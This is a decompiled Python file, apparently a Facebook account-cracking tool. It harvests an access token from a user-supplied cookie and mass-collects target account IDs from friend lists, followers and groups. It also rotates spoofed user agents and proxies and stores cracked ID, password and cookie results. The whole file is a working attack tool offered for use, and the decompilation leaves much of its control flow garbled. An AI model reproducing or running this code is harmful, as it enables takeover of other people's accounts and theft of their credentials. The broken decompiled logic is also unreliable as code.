# Source Generated with Decompyle++
# File: 2.pyc (Python 3.10)

import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON = sol()
uas_bawaan = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
uas_nokiac2 = 'NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile'
uas_nokiax20 = 'Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36'
uas_nokiax = 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)'
uas_samsungse = 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36'
uas_redmi9a = 'Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36'
uas_nokiaxl = 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12'
uas_tes = 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)'
uas_random = random.choice([
    'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36',
    'NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
    'Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36'])
uas_nokiac3 = 'NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
uas_iphone = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]'
uas_nokia5plus = 'Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36'
uas_random2 = random.choice([
    'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
    'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)',
    'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'])
ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
princp = []

try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt', 'w').write(prox)
finally:
    pass
if Exception:
    e = None
    
    try:
        print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
    finally:
        e = None
        del e
    e = None
    del e
    prox = open('.prox.txt', 'r').read().splitlines()
    for xd in range(10000):
        a = 'Mozilla/5.0 (Symbian/3; Series60/'
        b = random.randrange(1, 9)
        c = random.randrange(1, 9)
        d = 'Nokia'
        e = random.randrange(100, 9999)
        f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
        g = random.randrange(1, 9)
        h = random.randrange(1, 4)
        i = random.randrange(1, 4)
        j = random.randrange(1, 4)
        k = 'Mobile Safari/535.1'
        uaku = f'''{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'''
        ugen2.append(uaku)
        aa = 'Mozilla/5.0 (Linux; U; Android'
        b = random.choice([
            '6',
            '7',
            '8',
            '9',
            '10',
            '11',
            '12'])
        c = ' en-us; GT-'
        d = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        e = random.randrange(1, 999)
        f = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h = random.randrange(73, 100)
        i = '0'
        j = random.randrange(4200, 4900)
        k = random.randrange(40, 150)
        l = 'Mobile Safari/537.36'
        uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
        ugen.append(uaku2)
        for x in range(10):
            a = 'Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
            b = random.randrange(100, 9999)
            c = random.randrange(100, 9999)
            d = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            e = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            f = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            g = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            h = random.randrange(1, 9)
            i = '; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
            j = random.randrange(1, 9)
            k = random.randrange(1, 9)
            l = 'Mobile WVGA SMM-MMS/1.2.0 OPN-B'
            uak = f'''{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'''
            
            def uaku():
                
                try:
                    ua = open('bbnew.txt', 'r').read().splitlines()
                    for ub in ua:
                        ugen.append(ub)
                finally:
                    return None
                    a = requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
                    ua = open('.bbnew.txt', 'w')
                    aa = re.findall('line">(.*?)<', str(a))
                    for un in aa:
                        ua.write(un + '\n')
                    ua = open('.bbnew.txt', 'r').read().splitlines()
                    return None


            (id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
            cokbrut = []
            pwpluss = []
            pwnya = []
            P = '\x1b[1;97m'
            M = '\x1b[1;91m'
            H = '\x1b[1;92m'
            K = '\x1b[1;93m'
            B = '\x1b[1;94m'
            U = '\x1b[1;95m'
            O = '\x1b[1;96m'
            N = '\x1b[0m'
            Z = '\x1b[1;30m'
            sir = '\x1b[41m\x1b[1;97m'
            x = '\x1b[m'
            m = '\x1b[1;91m'
            k = '\x1b[93m'
            h = '\x1b[1;92m'
            hh = '\x1b[32m'
            u = '\x1b[95m'
            kk = '\x1b[33m'
            b = '\x1b[1;96m'
            p = '\x1b[0;34m'
            asu = random.choice([
                m,
                k,
                h,
                u,
                b])
            dic = {
                '1': 'January',
                '2': 'February',
                '3': 'March',
                '4': 'April',
                '5': 'May',
                '6': 'June',
                '7': 'July',
                '8': 'August',
                '9': 'September',
                '10': 'October',
                '11': 'November',
                '12': 'December' }
            dic2 = {
                '01': 'January',
                '02': 'February',
                '03': 'March',
                '04': 'April',
                '05': 'May',
                '06': 'June',
                '07': 'July',
                '08': 'August',
                '09': 'September',
                '10': 'October',
                '11': 'November',
                '12': 'Devember' }
            tgl = datetime.datetime.now().day
            bln = dic[str(datetime.datetime.now().month)]
            thn = datetime.datetime.now().year
            okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
            cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
            
            def waktu():
                now = datetime.now()
                hours = now.hour
                if hours <= hours or hours < 12:
                    timenow = 'good morning'
                    return timenow
                if hours <= hours or hours < 15:
                    timenow = 'good afternoon'
                    return timenow
                if hours <= hours or hours < 18:
                    timenow = 'good evening'
                    return timenow
                timenow = 'good night'
                return timenow

            
            def alvino_xy(u):
                for e in u + '\n':
                    sys.stdout.write(e)
                    sys.stdout.flush()
                    time.sleep(0.001)

            
            def clear():
                os.system('clear')

            
            def back():
                login()

            
            def banner():
                clear()
                alvino_xy(f'''\t{asu}                                               \n_________ _______          _________ ______  \n\\__    _/(  ___  )|\\     /|\\__   __/(  __  \\ \n   )  (  | (   ) || )   ( |   ) (   | (  \\  )\n   |  |  | (___) || (___) |   | |   | |   ) |\n   |  |  |  ___  ||  ___  |   | |   | |   | |\n   |  |  | (   ) || (   ) |   | |   | |   ) |\n|\\_)  )  | )   ( || )   ( |___) (___| (__/  )\n(____/   |/     \\||/     \\|\\_______/(______/                                              \n\t\t\t{m} ☯︎ {k} ☯︎ {h} ☯︎ {sir} CODER : JAHID404 {x}{m} ☯︎ {k} ☯︎ {h} ☯︎ {x}''')

            
            def rydah():
                cetak(nel('====================================================='))

            
            def chk():
                uuid = str(os.geteuid()) + str(os.getlogin())
                id = '|'.join(uuid)
                print('\x1b[1;92m╭────────────────────────────────────────────╮')
                print('\x1b[1;97m [\x1b[1;91m•\x1b[1;97m]\x1b[1;93m  YOUR ID : ' + id)
                print('\x1b[1;92m╰────────────────────────────────────────────╯')
                
                try:
                    httpCaht = requests.get('https://github.com/FB-KO/FB-KO/blob/main/Approval.txt').text
                    if id in httpCaht:
                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m]\x1b[1;97m  ♪YOUR ID IS ACTIVE√........\x1b[97m')
                        msg = str(os.geteuid())
                        time.sleep(1)
                finally:
                    return None
                    print('\x1b[1;97m [\x1b[1;91m•\x1b[1;97m]\x1b[1;93m YOUR ID IS NOT ACTIVE SEND MESSAGE ON WHATSAPP 01311662738 \x1b[97m')
                    time.sleep(1)
                    sys.exit()
                    return None
                    sys.exit()
                    if name == '__main__':
                        print(logo)
                        chk()
                        return None
                    return None


            chk()
            os.system('clear')
            
            def login():
                
                try:
                    token = open('.token.txt', 'r').read()
                    cok = open('.cok.txt', 'r').read()
                    tokenku.append(token)
                    
                    try:
                        sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + tokenku[0], {
                            'cookie': cok }, **('cookies',))
                        sy2 = json.loads(sy.text)['name']
                        sy3 = json.loads(sy.text)['id']
                        menu(sy2, sy3)
                    finally:
                        return None
                        if KeyError:
                            login_lagi334()
                        return None
                        if requests.exceptions.ConnectionError:
                            li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
                            lo = mark(li, 'red', **('style',))
                            sol().print(lo, 'cyan', **('style',))
                            exit()
                        return None
                        if IOError:
                            login_lagi334()
                            return None



            
            def login_lagi334():
                
                try:
                    os.system('clear')
                    banner()
                    cetak(nel('\t( ͠° ͟ʖ ͡°) WELCM 2 RYDAH TOOLS : [green]🇨 🇴 🇰 🇮  [white] (;´༎ຶٹ༎ຶ`)'))
                    asu = random.choice([
                        m,
                        k,
                        h,
                        b,
                        u])
                    cookie = input(f'''  [{h}•{x}] ENTER COOKIES :{asu} ''')
                    data = requests.get('https://business.facebook.com/business_locations', {
                        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
                        'referer': 'https://www.facebook.com/',
                        'host': 'business.facebook.com',
                        'origin': 'https://business.facebook.com',
                        'upgrade-insecure-requests': '1',
                        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                        'cache-control': 'max-age=0',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8',
                        'content-type': 'text/html; charset=utf-8' }, {
                        'cookie': cookie }, **('headers', 'cookies'))
                    find_token = re.search('(EAAG\\w+)', data.text)
                    ken = open('.token.txt', 'w').write(find_token.group(1))
                    cok = open('.cok.txt', 'w').write(cookie)
                    print(f'''  {x}[{h}•{x}]{h} LOGIN BERHASIL...!!!!{x} ''')
                    time.sleep(1)
                    exit()
                finally:
                    return None
                    if Exception:
                        e = None
                        
                        try:
                            os.system('rm -f .token.txt')
                            os.system('rm -f .cok.txt')
                            print('  %s[%sx%s]%s LOGIN GAGAL....TUMBAL LU MOKAD  !!%s' % (x, k, x, m, x))
                            exit()
                        finally:
                            e = None
                            del e
                            return None
                            e = None
                            del e



            
            def menu(my_name, my_id):
                
                try:
                    token = open('.token.txt', 'r').read()
                    cok = open('.cok.txt', 'r').read()
                finally:
                    pass

                None if IOError else os.system('clear')
                banner()
                ip = requests.get('https://api.ipify.org').text
                cetak(nel('\tHEY [green]%s[white] NGENTOD' % my_name))
                alvino_xy(h + '>> Your Idz : ' + str(my_id))
                print(h + '>> version : 2,0')
                print(h + '>>' + p + ' IP: ' + k + ip)
                cetak(nel('\tTERUNTUK [green]%s[white] CRACK SEWAJARNYA AJA,NTR SPAM IP LU SALAHIN GUA' % my_name))
                print('')
                print(h + '➪ 1. Crack Publik ')
                print('➪ 2. Crack Follower ')
                print('➪ 3. Crack Grup   ')
                print('➪ 4. Crack File\t')
                print('➪ 5. Crack Crack  ')
                print('➪ 0. Exit       ')
                _____alvino__adijaya_____ = input('\n➪ Pilih : ')
                if _____alvino__adijaya_____ in ('1',):
                    dump_massal()
                    return None
                if None in ('2',):
                    dump_follower()
                    return None
                if None in ('3',):
                    error()
                    return None
                if None in ('4',):
                    crack_file()
                    return None
                if None in ('5',):
                    result()
                    return None
                if None in ('0',):
                    os.system('rm -rf .token.txt')
                    os.system('rm -rf .cookie.txt')
                    print('➪ Sukses Logout+Hapus Kukis ')
                    exit()
                    return None
                None('➪ Pilih Yang Bener ngentod ')
                back()

            
            def error():
                print(f'''{k}➪ Maaf Fitur Ini Masih Di Perbaiki {x}''')
                time.sleep(4)
                back()

            
            def result():
                print('➪ Crack OK Anda ')
                print('➪ Crack CP Anda ')
                print('➪ Exit ')
                kz = input('\n➪ Pilih : ')
                if kz in ('1', '01'):
                    
                    try:
                        vin = os.listdir('CP')
                    finally:
                        pass

                    if None if FileNotFoundError else len(vin) == 0:
                        print('➪ Anda Tidak Memiliki Hasil CP ')
                        time.sleep(2)
                        back()
                        return None
                    cih = None
                    lol = { }
                    for isi in vin:
                        
                        try:
                            hem = open('CP/' + isi, 'r').readlines()
                        finally:
                            pass
                        continue
                        cih += 1
                        if cih < 10:
                            nom = '0' + str(cih)
                            lol.update({
                                str(cih): str(isi) })
                            lol.update({
                                nom: str(isi) })
                            print('[' + nom + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + x)
                            continue

                        lol.update({
                            str(cih): str(isi) })
                        print('[' + str(cih) + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + x)
                        geeh = input('\n>> Pilih : ')
                        
                        try:
                            geh = lol[geeh]
                        finally:
                            pass
                        if KeyError:
                            print('>> Pilih Yang Bener Kontol ')
                            exit()
                        else:
                            
                            try:
                                lin = open('CP/' + geh, 'r').read().splitlines()
                            finally:
                                pass
                            print('>> File Tidak Di Temukan ')
                            time.sleep(2)
                            back()
                            nocp = 0
                            for cpku in range(len(lin)):
                                cpkuni = lin[nocp].split('|')
                                cpkuh = f'''# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'''
                                sol().print(mark(cpkuh, 'yellow', **('style',)))
                                nocp += 1
                                input('[ Klik Enter ]')
                                back()
                                return None
                                if kz in ('2', '02'):
                                    
                                    try:
                                        vin = os.listdir('OK')
                                    finally:
                                        pass

                                    if None if FileNotFoundError else len(vin) == 0:
                                        print('>> Anda Tidak Mempunyai File OK ')
                                        time.sleep(2)
                                        back()
                                        return None
                                    cih = None
                                    lol = { }
                                    for isi in vin:
                                        
                                        try:
                                            hem = open('OK/' + isi, 'r').readlines()
                                        finally:
                                            pass
                                        continue
                                        cih += 1
                                        if cih < 100:
                                            nom = '0' + str(cih)
                                            lol.update({
                                                str(cih): str(isi) })
                                            lol.update({
                                                nom: str(isi) })
                                            print('[' + nom + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + x)
                                            continue

                                        lol.update({
                                            str(cih): str(isi) })
                                        print('[' + str(cih) + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + x)
                                        geeh = input('\n>> Pilih : ')
                                        
                                        try:
                                            geh = lol[geeh]
                                        finally:
                                            pass
                                        if KeyError:
                                            print('>> Pilih Yang Bener Kontol ')
                                            exit()
                                        else:
                                            
                                            try:
                                                lin = open('OK/' + geh, 'r').read().splitlines()
                                            finally:
                                                pass
                                            print('>> File Tidak Di Temukan ')
                                            time.sleep(2)
                                            back()
                                            nocp = 0
                                            for cpku in range(len(lin)):
                                                cpkuni = lin[nocp].split('|')
                                                cpkuh = f'''# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'''
                                                sol().print(mark(cpkuh, 'green', **('style',)))
                                                print(f'''{hh}COOKIE : {x}{cpkuni[2]}''')
                                                nocp += 1
                                                input('[ Klik Enter ]')
                                                back()
                                                return None
                                                if kz in ('0', '00'):
                                                    back()
                                                    return None
                                                None('>> Pilih Yang Bener Kontol ')
                                                exit()
                                                return None





            
            def dump_massal():
                
                try:
                    token = open('.token.txt', 'r').read()
                    cok = open('.cok.txt', 'r').read()
                finally:
                    pass

                if None if IOError else None if ValueError else jum < 1 or jum > 100:
                    print('➪ Gagal Dump Idz ')
                    exit()
                ses = requests.Session()
                yz = 0
                for met in range(jum):
                    yz += 1
                    kl = input('➪ Masukkan Id Ke ' + str(yz) + ' : ')
                    uid.append(kl)
                    for userr in uid:
                        
                        try:
                            col = ses.get('https://graph.facebook.com/v2.0/' + userr + '?fields=friends.limit(5000)&access_token=' + tokenku[0], {
                                'cookies': cok }, **('cookies',)).json()
                            for mi in col['friends']['data']:
                                
                                try:
                                    iso = mi['id'] + '|' + mi['name']
                                    if iso in id:
                                        pass
                                    else:
                                        id.append(iso)
                                finally:
                                    continue
                                    continue
                                    continue
                                    if (KeyError, IOError):
                                        continue
                                    if requests.exceptions.ConnectionError:
                                        print('➪ Sinyal Loh Kek Kontoll ')
                                        exit()
                                        continue
                                        
                                        try:
                                            print('')
                                            print(f'''\x1a Total Id Terkumpul💥 {h}''' + str(len(id)))
                                            setting()
                                        finally:
                                            return None
                                            if requests.exceptions.ConnectionError:
                                                print(f'''{x}''')
                                                print('➪ Sinyal Lo kek Kontol ')
                                                back()
                                                return None
                                            if (KeyError, IOError):
                                                print(f'''➪{k} Pertemanan Tidak Public {x}''')
                                                time.sleep(3)
                                                back()
                                                return None




            
            def dump_pengikut():
                
                try:
                    token = open('.token.txt', 'r').read()
                    cok = open('.cok.txt', 'r').read()
                finally:
                    pass

                None if IOError else print('>> Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
                pil = input('>> Masukkan Idz Target : ')
                
                try:
                    koh2 = requests.get('https://graph.facebook.com/' + pil + '?fields=subscribers.limit(99999)&access_token=' + tokenku[0], {
                        'cookie': cok }, **('cookies',)).json()
                    for pi in koh2['subscribers']['data']:
                        
                        try:
                            id.append(pi['id'] + '|' + pi['name'])
                        finally:
                            continue
                            continue
                            print(f'''>> Total Idz :{h} ''' + str(len(id)))
                            setting()
                            return None
                            if requests.exceptions.ConnectionError:
                                print('>> Koneksi Internet Bermasalah ')
                                exit()
                                return None
                            if (KeyError, IOError):
                                print('>> Gagal Mengambil Target ')
                                exit()
                                return None



            balmond = b + '[' + h + '✓' + b + ']'
            
            def lah():
                print('\r' + balmond + m + ' \x1b[1;95mTotal ID Yang Terkumpul :\x1b[1;97m ' + str(len(id)) + '                     ')
                input(balmond + m + '\x1b[1;97m Klik [\x1b[1;96m Enter ]\x1b[1;97m Jika Ingin Langsung Crack !!')
                setting()

            
            def grup():
                print('')
                id = input('' + balmond + h + ' \x1b[1;94m>> Masukkan Idz Grup :\x1b[1;94m ')
                ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36'
                miskinlu = {
                    'user-agent': ua }
                url = 'https://mbasic.facebook.com/groups/' + id
                ses = requests.Session()
                
                try:
                    gn = parser(ses.get(url, miskinlu, **('headers',)).text, 'html.parser')
                finally:
                    pass

                berr = None if requests.exceptions.ConnectionError else gn.find('title')
                berr2 = berr.text.replace(' | Facebook', '').replace(' Grup Publik', '')
                if berr2 == 'Masuk Facebook':
                    print(balmond + m + ' Limit, Silahkan Mode Pesawat Dan Coba Lagi..')
                    time.sleep(0.5)
                    crack_grup()
                elif berr2 == 'Kesalahan':
                    jalan(balmond + m + ' Grup Tidak Ditemukan..')
                    time.sleep(0.5)
                    crack_grup()
                
                print('' + balmond + p + ' \x1b[1;94m>> Nama Grup :\x1b[1;97m ' + berr2)
                ggs = gn.find_all('table')
                ang = []
                for ff in ggs:
                    anggo = ff.text
                    bro = anggo.replace('Anggota', '')
                    
                    try:
                        mex = int(bro)
                        jumlah = ang.append(mex)
                    finally:
                        continue
                        continue
                        if len(ang) == 0:
                            print(balmond + h + ' Anggota : -')
                        else:
                            print(balmond + h + ' \x1b[1;94m>> Anggota :\x1b[1;97m ' + str(ang[0]))
                        grup1(url)
                        return None


            
            def grup1(urls):
                use = []
                ses = requests.Session()
                print('' + balmond + m + ' \x1b[1;94mJika Berhenti, Mode Pesawat 5 Detik')
                print(balmond + m + ' \x1b[1;94mSedang Mengumpulkan ID')
                print(balmond + m + ' \x1b[1;94mTekan CTRL + C Untuk Stop')
                
                try:
                    ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
                    miskinlu = {
                        'user-agent': ua }
                    
                    try:
                        url = use[0]
                    finally:
                        pass
                    url = urls
                    set = parser(ses.get(url, miskinlu, **('headers',)).text, 'html.parser')
                    bf2 = set.find_all('a')
                    for g in bf2:
                        css = str(g).split('>')
                        if 'Lihat Postingan Lainnya</span' in css:
                            bcj = str(g).replace('<a href="', '').replace('amp;', '')
                            bcj2 = bcj.split(' ')[0].replace('"><img', '')
                    tes = set.find_all('table')
                    for cari in tes:
                        liatnih = cari.text
                        spl = liatnih.split(' ')
                        if 'mengajukan' in spl:
                            idsiapa = re.findall('content_owner_id_new.\\w+', str(cari))
                            idyou = idsiapa[0].replace('content_owner_id_new.', '')
                            namayou = liatnih.replace(' mengajukan pertanyaan .', '')
                            idku = idyou + '|' + namayou
                            if idku in id:
                                continue
                            id.append(idku)
                            print('\r' + balmond + h + ' { ' + k + 'Proses Mengambil ID ' + str(len(id)) + h + ' }', '', **('end',))
                            sys.stdout.flush()
                            continue
                        if '>' in spl:
                            idsiapa = re.findall('content_owner_id_new.\\w+', str(cari))
                            idyou = idsiapa[0].replace('content_owner_id_new.', '')
                            namayou = liatnih.split(' > ')[0]
                            idku = idyou + '|' + namayou
                            if idku in id:
                                continue
                            id.append(idku)
                            print('\r' + balmond + h + ' { ' + O + 'Mengumpulkan ID ' + str(len(id)) + h + ' }', '', **('end',))
                            sys.stdout.flush()
                            continue
                    
                    try:
                        link_ = bcj2
                        use.insert(0, 'https://mbasic.facebook.com' + link_)
                    finally:
                        pass
                    girang = set.find('title')
                    girang2 = girang.text.replace(' | Facebook', '').replace(' Grup Publik', '')
                    if girang2 == 'Masuk Facebook':
                        pass
                    else:
                        lah()


                finally:
                    pass
                if requests.exceptions.ConnectionError:
                    
                    try:
                        time.sleep(31)
                    finally:
                        pass
                    if KeyboardInterrupt:
                        lah()
                    


                if KeyboardInterrupt:
                    lah()
                

            
            def crack_file():
                
                try:
                    vin = os.listdir('DUMP')
                finally:
                    pass

                if None if FileNotFoundError else len(vin) == 0:
                    print('>> Kamu Tidak Memiliki File Dump ')
                    time.sleep(2)
                    back()
                    return None
                cih = None
                lol = { }
                for isi in vin:
                    
                    try:
                        hem = open('DUMP/' + isi, 'r').readlines()
                    finally:
                        pass
                    continue
                    cih += 1
                    if cih < 100:
                        nom = '' + str(cih)
                        lol.update({
                            str(cih): str(isi) })
                        lol.update({
                            nom: str(isi) })
                        print(f'''>> %s. %s ({h} %s{x} idz )''' % (nom, isi, len(hem)))
                        continue

                    lol.update({
                        str(cih): str(isi) })
                    print('[' + str(cih) + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + x)
                    print('>> %s. %s ({h} %s {x}idz) ' % (cih, isi, len(hem)))
                    geeh = input('\n>> Pilih : ')
                    
                    try:
                        geh = lol[geeh]
                    finally:
                        pass
                    if KeyError:
                        print(f'''{k}>> Pilih Yang Bener Kontol {x}''')
                        time.sleep(3)
                        back()
                    else:
                        
                        try:
                            lin = open('DUMP/' + geh, 'r').read().splitlines()
                        finally:
                            pass
                        print('>> File Tidak Ditemukan, Coba Lagi Nanti ')
                        time.sleep(2)
                        back()
                        for xid in lin:
                            id.append(xid)
                            setting()
                            return None



            
            def setting():
                print(f'''{x}>> 1. Akun tua (NOT RECOMMENDED) ''')
                print('>> 2. Akun New ')
                print('>> 3. Random ')
                print('')
                hu = input('>> Pilih : ')
                if hu in ('1', '01'):
                    for tua in sorted(id):
                        id2.append(tua)
                elif hu in ('2', '02'):
                    muda = []
                    for bacot in sorted(id):
                        muda.append(bacot)
                    bcm = len(muda)
                    bcmi = bcm - 1
                    for xmud in range(bcm):
                        id2.append(muda[bcmi])
                        bcmi -= 1
                elif hu in ('3', '03'):
                    for bacot in id:
                        xx = random.randint(0, len(id2))
                        id2.insert(xx, bacot)
                else:
                    print('>> Pilih Yang Bener Kontooll ')
                    exit()
                print('>> 1. Mobile ')
                print('>> 2. Mbasic ')
                print('>> 3. Touch  ')
                print('>> 4. Mtouch ')
                print('')
                hc = input('>> Pilih : ')
                if hc in ('1', '01'):
                    method.append('mobile')
                elif hc in ('2', '02'):
                    method.append('free')
